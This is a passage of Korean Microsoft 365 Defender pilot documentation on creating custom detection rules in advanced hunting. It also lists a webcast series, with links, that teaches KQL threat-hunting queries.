6. **만들기** 를 선택합니다. 그런 다음 탐색 **패널에서 사용자** 지정 검색 규칙을 선택합니다.

   ![메뉴의 사용자 지정 검색 규칙 옵션 스크린샷](../../media/mtp/fig27a.png)

   ![규칙 및 실행 세부 정보를 표시하는 검색 규칙 페이지의 스크린샷](../../media/mtp/fig27b.png)

   이 페이지에서 세부 정보 페이지를 여는 검색 규칙을 선택할 수 있습니다.

   ![규칙 실행, 트리거된 경고 및 작업, 검색 편집 등 상태를 확인할 수 있는 전자 메일 첨부 파일 페이지의 스크린샷](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>추가 고급 헌팅 연습

고급 헌팅에 대한 자세한 내용을 알아보기 위해 다음 웹캐스트에서는 Microsoft 365 Defender 내에서 고급 헌팅 기능을 통해 상호 기반 쿼리를 만들고 엔터티에 피벗하고 사용자 지정 검색 및 수정 작업을 만드는 방법을 제공합니다.

> [!NOTE]
> 파일럿 테스트 랩 환경에서 GitHub 쿼리를 실행할 수 있도록 사용자 계정으로 준비하세요.

|제목|설명|MP4 다운로드|YouTube에서 시청|사용할 CSL 파일|
|---|---|---|---|---|
|에피소드 1: KQL 기본 사항|Defender의 고급 헌팅 기능에 대한 기본 Microsoft 365 있습니다. 사용 가능한 고급 헌팅 데이터와 기본 KQL 구문 및 연산자에 대해 자세히 알아보습니다.|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[에피소드 1: Git의 CSL 파일](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|에피소드 2: 참가|고급 헌팅의 데이터와 테이블을 함께 조인하는 방법에 대해 계속 학습할 것입니다. 내부, 외부, 고유 및 세미 조인과 기본 Kusto 내부 유니크 조인의 미주에 대해 자세히 알아보습니다.|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[에피소드 2: Git의 CSL 파일](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|에피소드 3: 데이터 요약, 피벗 및 시각화|이제 데이터를 필터링, 조작 및 조인할 수 있습니다. 이제 요약, 수량화, 피벗 및 시각화를 시작할 수 있습니다. 이 에피소드에서는 고급 헌팅 계획의 추가 테이블로 나들이하는 동안 수행할 수 있는 계산과 요약 연산자에 대해 다루게 됩니다. 데이터 집합을 분석을 개선하는 데 도움이 되는 차트로 전환합니다.|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[에피소드 3: Git의 CSL 파일](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|에피소드 4: 헌트해보시고요! 인시던트 추적에 KQL 적용|일부 공격자 활동을 추적하는 시간입니다! 이 에피소드에서는 공격을 추적하기 위해 Microsoft 365 KQL 및 고급 헌팅에 대한 향상된 이해를 사용할 것입니다. 사이버 보안 ABC를 포함하여 공격자 활동을 추적하는 데 사용되는 몇 가지 팁과 트릭과 인시던트 대응에 적용하는 방법을 알아보십시오.|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[에피소드 4: Git의 CSL 파일](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>다음 단계

|![닫기 및 요약 단계](../../media/mtp/close.png) <br>[닫기 및 요약 단계](m365d-pilot-close.md)|사용자 Microsoft 365 Defender 파일럿 결과를 분석하여 이해 관계자에게 제시하고 다음 단계를 진행합니다.
|:-----|:-----|
